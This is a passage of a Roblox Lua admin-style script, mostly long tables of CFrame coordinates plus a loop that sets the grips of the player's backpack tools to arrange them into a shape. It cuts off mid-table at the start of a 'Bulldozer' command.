CFrame.new(2.799999713897705, 2.4000003337860107, 0.5),
CFrame.new(1.600000262260437, -4.599999904632568, 0.5),
CFrame.new(0.800000011920929, 0.900000274181366, -6.5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -5),
CFrame.new(0.800000011920929, 0.900000274181366, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -1),
CFrame.new(3.299999713897705, 1.900000810623169, -4.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -3.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -7),
CFrame.new(1.799999713897705, 1.9000003337860107, -1),
CFrame.new(-0.20000000298023224, 0.900000274181366, -4),
CFrame.new(1.7999999523162842, -0.09999972581863403, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -5.5),
CFrame.new(3.799999952316284, 2.4000003337860107, 1.3000001907348633),
CFrame.new(0.30000001192092896, -0.599999725818634, -4.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -7.300000190734863),
CFrame.new(3.299999952316284, -0.599999725818634, -5),
CFrame.new(0.800000011920929, -0.599999725818634, -7),
CFrame.new(1.3000001907348633, -3.0999996662139893, -2.5),
CFrame.new(0.30000001192092896, 2.4000003337860107, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -2),
CFrame.new(0.800000011920929, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -1.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, 0.5),
CFrame.new(2.799999952316284, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, 0.900000274181366, -1.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -4.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -6),
CFrame.new(0.800000011920929, -0.09999972581863403, -7),
CFrame.new(1.2999999523162842, -0.09999972581863403, -4.5),
CFrame.new(3.799999952316284, 2.200000524520874, 0.09999942779541016),
CFrame.new(1.799999713897705, 2.4000003337860107, 0.5),
CFrame.new(0.800000011920929, -0.599999725818634, -1),
CFrame.new(1.2999999523162842, -0.599999725818634, -4),
CFrame.new(2.299999952316284, -1.5999996662139893, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, -1),
CFrame.new(1.799999713897705, 2.4000003337860107, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -4),
CFrame.new(-0.699999988079071, 2.000000238418579, 0.8999996185302734),
CFrame.new(3.299999952316284, -0.599999725818634, -6.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, 0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -6.199999809265137),
CFrame.new(0.30000001192092896, 1.9000003337860107, -4),
CFrame.new(1.799999713897705, 1.9000003337860107, -0.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -0.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -1.5),
CFrame.new(2.299999713897705, 1.9000003337860107, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -4.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -6.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -5.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, 0.900000274181366, 0.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -6.5),
CFrame.new(1.799999713897705, 0.900000274181366, -5),
CFrame.new(1.2999999523162842, 0.900000274181366, 0),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -6),
CFrame.new(0.30000001192092896, -1.5999996662139893, -6.5),
CFrame.new(2.799999952316284, -0.599999725818634, -4.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -4.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -4),
CFrame.new(2.299999713897705, 1.9000003337860107, -7),
CFrame.new(-0.699999988079071, 2.000000238418579, -1.6000003814697266),
CFrame.new(0.30000001192092896, -2.0999996662139893, -3.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -2),
CFrame.new(3.299999952316284, -0.599999725818634, -3.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -7),
CFrame.new(0.800000011920929, 0.900000274181366, -0.5),
CFrame.new(-0.699999988079071, 2.200000047683716, -1.5),
CFrame.new(3.299999952316284, -3.099999189376831, -5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -0.20000028610229492),
CFrame.new(2.299999713897705, 1.9000003337860107, -4.5),
CFrame.new(2.299999952316284, -0.599999725818634, -4.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -1.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5),
CFrame.new(2.799999952316284, -0.09999972581863403, -4.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -3),
CFrame.new(1.799999713897705, 1.9000003337860107, -5),
CFrame.new(2.299999952316284, -0.09999972581863403, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, 0),
CFrame.new(0.800000011920929, -0.599999725818634, -2),
CFrame.new(0.30000001192092896, 1.9000003337860107, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -2),
CFrame.new(-0.699999988079071, 2.3999998569488525, -3.6999998092651367),
CFrame.new(3.299999952316284, -1.0999994277954102, -1),
CFrame.new(1.799999713897705, 0.900000274181366, -3.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -2),
CFrame.new(0.30000001192092896, -2.0999996662139893, -3),
CFrame.new(2.299999952316284, -0.09999972581863403, -6),
CFrame.new(3.299999952316284, -3.099999189376831, -6),
CFrame.new(1.7999999523162842, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, -0.09999972581863403, 0),
CFrame.new(-0.20000000298023224, -2.5999996662139893, -5),
CFrame.new(2.799999952316284, 0.900000274181366, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, -4),
CFrame.new(3.299999952316284, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -3.0999996662139893, -5.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -4.5),
CFrame.new(3.299999713897705, 1.900000810623169, -1.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -2.700000286102295),
CFrame.new(0.30000001192092896, -3.0999996662139893, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -1.5999994277954102, -6.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -1),
CFrame.new(0.30000001192092896, 0.900000274181366, -5.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -4.100000381469727),
CFrame.new(2.299999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, 0.09999990463256836),
CFrame.new(1.799999713897705, 1.9000003337860107, -3),
CFrame.new(-0.699999988079071, 2.3999998569488525, -1.1999998092651367),
CFrame.new(3.299999952316284, -0.599999725818634, -7),
CFrame.new(0.30000001192092896, 2.4000003337860107, -4.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -6.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, 0.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -4),
CFrame.new(1.799999713897705, 0.900000274181366, -5.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -1),
CFrame.new(1.2999999523162842, 1.9000003337860107, -0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -2),
CFrame.new(0.30000001192092896, 0.900000274181366, 0),
CFrame.new(1.3000001907348633, -4.400000095367432, 0.5),
CFrame.new(0.800000011920929, -0.599999725818634, 0.5),
CFrame.new(3.299999713897705, 1.900000810623169, -6),
CFrame.new(3.299999952316284, 0.900000274181366, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -3.5),
CFrame.new(2.299999952316284, -0.09999972581863403, 0),
CFrame.new(1.2999999523162842, 1.9000003337860107, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -6),
CFrame.new(2.299999952316284, -0.09999972581863403, -2.5),
CFrame.new(1.2999999523162842, -0.599999725818634, 0.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5),
CFrame.new(-0.699999988079071, 2.200000047683716, -4.90000057220459),
CFrame.new(-0.699999988079071, 2.799999952316284, -4.800000190734863),
CFrame.new(3.299999952316284, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, 2.4000003337860107, -2),
CFrame.new(3.299999952316284, -1.5999994277954102, -5),
CFrame.new(0.800000011920929, -0.599999725818634, -1.5),
CFrame.new(2.799999952316284, -0.599999725818634, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -4),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -4),
CFrame.new(1.799999713897705, 0.900000274181366, 0),
CFrame.new(0.800000011920929, 0.900000274181366, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, 0),
CFrame.new(0.30000001192092896, -3.0999996662139893, -5),
CFrame.new(0.30000001192092896, 0.900000274181366, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -4),
CFrame.new(2.299999713897705, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -7),
CFrame.new(2.799999952316284, -0.599999725818634, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -4.5),
CFrame.new(2.299999713897705, 1.9000003337860107, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, 0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -6.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -6),
CFrame.new(0.30000001192092896, -0.09999972581863403, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, 0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -0.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -0.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -0.20000028610229492),
CFrame.new(2.299999952316284, -0.599999725818634, -6),
CFrame.new(1.7999999523162842, -0.599999725818634, -2.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -6),
CFrame.new(2.299999713897705, 1.9000003337860107, -0.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, 1),
CFrame.new(1.7999999523162842, -0.599999725818634, -6.5),
CFrame.new(1.2999999523162842, -2.0999996662139893, 0.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -2.5),
CFrame.new(-0.699999988079071, 2.200000047683716, -4),
CFrame.new(0.800000011920929, 0.900000274181366, -3),
CFrame.new(0.30000001192092896, 0.900000274181366, -5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -5),
CFrame.new(-0.699999988079071, 2.799999952316284, -1.6000003814697266),
CFrame.new(2.3000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.300000548362732, -4.599999904632568, 0.3000001907348633),
CFrame.new(3.799999952316284, 2.6000006198883057, 0.09999990463256836),
CFrame.new(2.799999952316284, -0.599999725818634, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -2.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, 0.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, 1.3000001907348633),
CFrame.new(0.800000011920929, 1.9000003337860107, -0.5),
CFrame.new(2.299999713897705, 0.900000274181366, -6),
CFrame.new(2.799999952316284, -0.599999725818634, -5),
CFrame.new(0.30000001192092896, -0.599999725818634, -5),
CFrame.new(2.299999952316284, -0.09999972581863403, -5.5),
CFrame.new(2.8000001907348633, -3.0999996662139893, -5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -1),
CFrame.new(3.299999713897705, 1.900000810623169, -3),
CFrame.new(-0.20000000298023224, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, 0.900000274181366, -3.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -3.5),
CFrame.new(2.799999713897705, 1.9000003337860107, 0.8000001907348633),
CFrame.new(2.299999952316284, -2.0999996662139893, -0.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -4.5),
CFrame.new(3.799999952316284, 2.000000238418579, -4.100000381469727),
CFrame.new(0.30000001192092896, -3.0999996662139893, -6.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -4),
CFrame.new(2.299999952316284, -2.0999996662139893, -2),
CFrame.new(0.30000001192092896, -0.599999725818634, -4),
CFrame.new(0.30000001192092896, 1.9000003337860107, -1.5),
CFrame.new(1.799999713897705, 0.900000274181366, -3),
CFrame.new(3.799999952316284, 2.4000003337860107, -0.20000028610229492),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -6),
CFrame.new(1.2999999523162842, -0.09999972581863403, -2),
CFrame.new(0.800000011920929, -0.09999972581863403, -4),
CFrame.new(2.299999952316284, -0.599999725818634, -1.5),
CFrame.new(-0.699999988079071, 2.799999952316284, 0.19999980926513672),
CFrame.new(0.30000001192092896, -0.599999725818634, -2.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -4.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, 0),
CFrame.new(3.799999952316284, 2.8000004291534424, -7.300000190734863),
CFrame.new(1.3000001907348633, -3.0999996662139893, -3),
CFrame.new(1.2999999523162842, 1.9000003337860107, -1),
CFrame.new(0.30000001192092896, -2.0999996662139893, -2),
CFrame.new(0.800000011920929, -0.09999972581863403, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, 0),
CFrame.new(-0.20000000298023224, -0.09999972581863403, 0.5),
CFrame.new(3.799999952316284, 2.200000524520874, -7.40000057220459),
CFrame.new(1.7999999523162842, -0.09999972581863403, -0.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -5),
CFrame.new(3.299999952316284, -1.0999994277954102, -0.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -2.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -6.5),
CFrame.new(3.799999952316284, 2.8000004291534424, 0.8999996185302734),
CFrame.new(1.2999999523162842, -0.09999972581863403, -2.5),
CFrame.new(0.800000011920929, -2.5999996662139893, 0),
CFrame.new(1.3000001907348633, -3.0999996662139893, -6),
CFrame.new(1.2999999523162842, -1.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -1.1999998092651367),
CFrame.new(1.799999713897705, 1.9000003337860107, 0),
CFrame.new(-0.20000000298023224, 0.900000274181366, -7),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.299999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -7),
CFrame.new(3.799999952316284, 1.900000810623169, 0.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -1),
CFrame.new(2.3000001907348633, -2.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -2.700000286102295),
CFrame.new(1.7999999523162842, -2.5999996662139893, -1),
CFrame.new(3.299999952316284, -3.099999189376831, -7),
CFrame.new(1.7999999523162842, -2.5999996662139893, -4),
CFrame.new(1.3000001907348633, -3.0999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.8000004291534424, -2.3000001907348633),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -1.5),
CFrame.new(3.299999952316284, 0.900000274181366, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -1),
CFrame.new(0.800000011920929, 1.9000003337860107, 0),
CFrame.new(3.299999952316284, -0.599999725818634, -3),
CFrame.new(1.2999999523162842, -1.5999996662139893, 0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -3.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -7.700000762939453),
CFrame.new(-0.699999988079071, 2.000000238418579, -6.600000381469727),
CFrame.new(0.30000001192092896, -0.599999725818634, -2),
CFrame.new(2.299999713897705, 0.900000274181366, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -2.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -1.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -2.5),
CFrame.new(2.299999713897705, 0.900000274181366, 0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -7),
CFrame.new(0.800000011920929, 0.900000274181366, -1),
CFrame.new(-0.20000000298023224, -0.599999725818634, 0),
CFrame.new(0.800000011920929, -0.09999972581863403, -1.5),
CFrame.new(1.300000548362732, -4.599999904632568, 0.6999998092651367),
CFrame.new(2.799999952316284, -1.5999996662139893, -7),
CFrame.new(1.799999713897705, 1.9000003337860107, -4),
CFrame.new(3.799999952316284, 2.200000524520874, -4),
CFrame.new(3.299999952316284, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, -0.599999725818634, -0.5),
CFrame.new(2.299999952316284, -0.599999725818634, -5.5),
CFrame.new(2.799999952316284, 0.900000274181366, -3),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -2.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -3.5),
CFrame.new(3.799999952316284, 2.9000003337860107, 0.5999999046325684),
CFrame.new(0.3999994397163391, 1.9000003337860107, 1.1999998092651367),
CFrame.new(3.299999952316284, -0.599999725818634, -0.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -5.5),
CFrame.new(2.799999952316284, -0.599999725818634, -7),
CFrame.new(0.800000011920929, -3.0999996662139893, -6.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -4),
CFrame.new(1.7999999523162842, -0.09999972581863403, -6.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -7),
CFrame.new(3.299999952316284, -0.09999972581863403, -2.5),
CFrame.new(2.299999952316284, -0.599999725818634, -2),
CFrame.new(-0.20000000298023224, -0.599999725818634, -6.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -1),
CFrame.new(3.299999952316284, -1.0999994277954102, -1.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -1),
CFrame.new(1.1500003337860107, -0.30000001192092896, 1.0500001907348633),
CFrame.new(-0.20000000298023224, 0.900000274181366, 0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, 0.5),
CFrame.new(3.299999952316284, -0.599999725818634, 0),
CFrame.new(2.799999952316284, -0.09999972581863403, -0.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, 0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -2),
CFrame.new(1.3000001907348633, -3.0999996662139893, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -1),
CFrame.new(-0.699999988079071, 2.8999998569488525, -4.399999618530273),
CFrame.new(2.799999713897705, 1.9000003337860107, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -3.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -4.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, 0.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, 0),
CFrame.new(2.299999952316284, -0.599999725818634, -1),
CFrame.new(1.2999999523162842, 0.900000274181366, -2.5),
CFrame.new(2.299999713897705, 2.4000003337860107, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -3),
CFrame.new(0.800000011920929, -0.599999725818634, -6.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -6),
CFrame.new(0.30000001192092896, -0.599999725818634, -3.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -4.5),
CFrame.new(3.799999952316284, 2.000000238418579, 0.8999996185302734),
CFrame.new(2.799999952316284, -0.09999972581863403, -3.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -3.5),
CFrame.new(2.299999713897705, 0.900000274181366, -5),
CFrame.new(2.8000001907348633, -3.0999996662139893, -6.5),
CFrame.new(2.799999952316284, -0.599999725818634, -3.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -4),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -7),
CFrame.new(1.799999713897705, 2.4000003337860107, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -5.5),
CFrame.new(3.799999952316284, 1.900000810623169, -2),
CFrame.new(1.7999999523162842, -1.5999996662139893, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -2.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5.5),
CFrame.new(-0.699999988079071, 2.799999952316284, 0.8999996185302734),
CFrame.new(-0.699999988079071, 2.3999998569488525, -5.200000762939453),
CFrame.new(3.299999952316284, 0.900000274181366, -3.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -2.5),
CFrame.new(1.8499996662139893, -0.30000001192092896, 1.0500001907348633),
CFrame.new(1.3000001907348633, -3.0999996662139893, -1),
CFrame.new(3.799999952316284, 2.8000004291534424, -1.6000003814697266),
CFrame.new(0.800000011920929, 0.900000274181366, -5.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -0.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -3),
CFrame.new(-0.20000000298023224, -0.599999725818634, -3),
CFrame.new(2.299999713897705, 0.900000274181366, -3),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -4),
CFrame.new(1.8000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -4),
CFrame.new(-0.20000000298023224, 0.900000274181366, 0),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5),
CFrame.new(1.2999999523162842, 0.900000274181366, -3),
CFrame.new(-0.699999988079071, 2.8999998569488525, -1.9000000953674316),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -0.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -6.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -6),
CFrame.new(2.299999952316284, -0.599999725818634, 0.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -4.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -3.5),
CFrame.new(2.799999952316284, -2.5999996662139893, -7),
CFrame.new(3.299999713897705, 2.400000810623169, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, 0.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -1.5),
CFrame.new(0.30000001192092896, -2.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.8000004291534424, -4.800000190734863),
CFrame.new(1.7999999523162842, -2.5999996662139893, -5),
CFrame.new(0.800000011920929, -2.5999996662139893, -5),
CFrame.new(0.30000001192092896, -0.599999725818634, -1.5),
CFrame.new(3.299999952316284, -2.5999996662139893, -5),
CFrame.new(2.3000001907348633, -2.5999996662139893, -5),
CFrame.new(2.799999713897705, 1.9000003337860107, -6.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -3.5),
CFrame.new(2.299999713897705, 0.900000274181366, -6.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -3.6999998092651367),
CFrame.new(2.3000001907348633, -3.0999996662139893, -5.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -7),
CFrame.new(3.799999952316284, 2.6000006198883057, -6.5),
CFrame.new(0.30000001192092896, -0.599999725818634, 0),
CFrame.new(-0.699999988079071, 2.5999996662139893, -7.399999618530273),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -3),
CFrame.new(-0.20000000298023224, -0.599999725818634, -2),
CFrame.new(0.800000011920929, 1.9000003337860107, -3.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -5.200000762939453),
CFrame.new(-0.699999988079071, 2.000000238418579, -4.800000190734863),
CFrame.new(3.799999952316284, 2.000000238418579, -4.800000190734863),
CFrame.new(1.1500003337860107, -1.0999996662139893, 1.0500001907348633),
CFrame.new(-0.699999988079071, 2.3999998569488525, -7.700000762939453),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -0.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -2.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -6),
CFrame.new(3.299999952316284, -1.0999994277954102, -3),
CFrame.new(0.800000011920929, -3.0999996662139893, -6),
CFrame.new(2.299999952316284, -0.09999972581863403, -3.5),
CFrame.new(3.299999952316284, -0.599999725818634, 0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -7),
CFrame.new(0.800000011920929, -0.599999725818634, -4.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -2.700000286102295),
CFrame.new(1.2999999523162842, -0.599999725818634, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -5.5),
CFrame.new(1.799999713897705, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -4.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -4),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5),
CFrame.new(3.799999952316284, 2.6000006198883057, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -6),
CFrame.new(2.299999952316284, -2.0999996662139893, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -1.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -3),
CFrame.new(3.299999952316284, -1.0999994277954102, 0),
CFrame.new(0.800000011920929, 1.9000003337860107, -2),
CFrame.new(2.799999713897705, 1.9000003337860107, 0),
CFrame.new(0.30000001192092896, -0.09999972581863403, -3),
CFrame.new(1.7999999523162842, -2.5999996662139893, -2.5),
CFrame.new(2.299999713897705, 1.9000003337860107, -6.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -7),
CFrame.new(-0.699999988079071, 2.3999998569488525, -0.20000028610229492),
CFrame.new(0.30000001192092896, 2.4000003337860107, -2),
CFrame.new(0.800000011920929, -1.5999996662139893, -6.5),
CFrame.new(3.799999952316284, 2.6000006198883057, -1.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -6.5),
CFrame.new(0.800000011920929, -0.599999725818634, -5.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -2),
CFrame.new(2.299999713897705, 2.4000003337860107, -4.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -7),
CFrame.new(0.30000001192092896, 1.9000003337860107, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -0.5),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -2.5),
CFrame.new(1.799999713897705, 0.900000274181366, -1.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -2.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.000000238418579, -6.600000381469727),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -1.5),
CFrame.new(2.799999952316284, 0.900000274181366, -5.5),
CFrame.new(0.30000001192092896, -2.0999996662139893, -1.5),
CFrame.new(3.299999952316284, -2.5999996662139893, -7),

}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 
end)
AddCmd('Bulldozer','',function()

local Handles = {
CFrame.new(2.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(0.23483513295650482, 1.5000009536743164, -0.23483578860759735),
CFrame.new(1.2348361015319824, -4.999999046325684, -7.234835624694824),
CFrame.new(3.134834051132202, 1.6705914735794067, 5.682201385498047),
CFrame.new(3.734832525253296, 3.0000009536743164, -1.234834909439087),
CFrame.new(-0.7651630640029907, -5, -2.734834909439087),
CFrame.new(2.7348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(-0.265164852142334, 1.5000004768371582, -2.234834909439087),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -1.2348353862762451),
CFrame.new(2.134834051132202, 1.9294102191925049, 7.148129940032959),
CFrame.new(5.234833717346191, 1.5000015497207642, -3.234834671020508),
CFrame.new(4.234834671020508, -0.49999773502349854, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.5000002384185791, 0.7651643753051758),
